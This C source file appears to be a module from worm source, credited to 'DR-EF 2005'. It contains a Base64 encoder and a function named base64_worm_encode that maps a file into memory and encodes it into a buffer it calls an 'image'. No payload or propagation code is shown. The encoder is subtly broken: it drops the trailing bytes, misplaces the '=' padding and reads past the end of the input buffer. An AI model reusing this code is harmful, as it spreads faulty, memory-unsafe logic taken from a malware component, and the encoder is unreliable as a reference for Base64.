   #include "stdafx.h"


   //base64 module (c) DR-EF 2005


   int Base64(char *StartOfData,char *Output,int SizeOfData)
   {
       int encoded=0,i,l=0;
       char Base64Table[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
       long buffer,buffer2;
       do
       {
           buffer=0;
           buffer |= (unsigned char) *StartOfData;
           buffer<<=8;
           StartOfData++;
           buffer |= (unsigned char) *StartOfData;
           buffer<<=8;
           StartOfData++;
           buffer |= (unsigned char) *StartOfData;
           StartOfData++;
           for(i=3;i>=0;i--,l++)
           {
               buffer2=buffer;
               buffer2 &= 0x3f;
               *(Output + i)=Base64Table[buffer2];
               buffer>>=6;
           }
           Output+=4;
           encoded+=4;
           SizeOfData-=3;
           if(l==76 && SizeOfData>3)
           {
               *Output=0xd;
               Output++;
               *Output=0xa;
               Output++;
               encoded+=2;
               l=0;
           }
           if(SizeOfData==2)
           {
               *Output='=';
               encoded++;
               return encoded;
           }
           if(SizeOfData==1)
           {
               *Output='=';
               Output++;
               *Output='=';
               encoded+=2;
               return encoded;
           }
       }while(SizeOfData!=0);
       return encoded;
   }

   BOOL base64_worm_encode(char file[],HGLOBAL &mem,int &size)
   {
       /*
           base64 image creation function

           paramters:
           ----------
           file        [input]     - file path
           mem         [output]    - memory with image
           size        [output]    - image size

           return value:

           true\false

       */

       HANDLE hfile,hmap,hmapbase;
       DWORD fsize;
       HGLOBAL hmem;

       int Encoded_data_size;

       hfile=CreateFile(file,GENERIC_READ,FILE_SHARE_READ,
           NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

       if(hfile==INVALID_HANDLE_VALUE)
           return FALSE;

       fsize=GetFileSize(hfile,NULL);

       if(fsize==0xFFFFFFFF)
       {
           CloseHandle(hfile);
           return FALSE;
       }

       hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

       if(hmap==NULL)
       {
           CloseHandle(hfile);
           return FALSE;
       }

       hmapbase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,NULL,NULL);

       if(hmapbase==NULL)
       {
           CloseHandle(hmap);
           CloseHandle(hfile);
           return FALSE;
       }



       hmem=GlobalAlloc(GPTR,(fsize+(fsize/3)+(fsize/4)+0x400));       //allocate memory

       if(hmem==NULL)
       {
           UnmapViewOfFile(hmapbase);
           CloseHandle(hmap);
           CloseHandle(hfile);
           return FALSE;
       }

       Encoded_data_size=Base64((char *)hmapbase,(char *)hmem,fsize);

       UnmapViewOfFile(hmapbase);
       CloseHandle(hmap);
       CloseHandle(hfile);


       mem=hmem;

       size=Encoded_data_size;

       return TRUE;
   }

   void Base64_free_image(HGLOBAL mem)
   {
       GlobalFree(mem);
   }
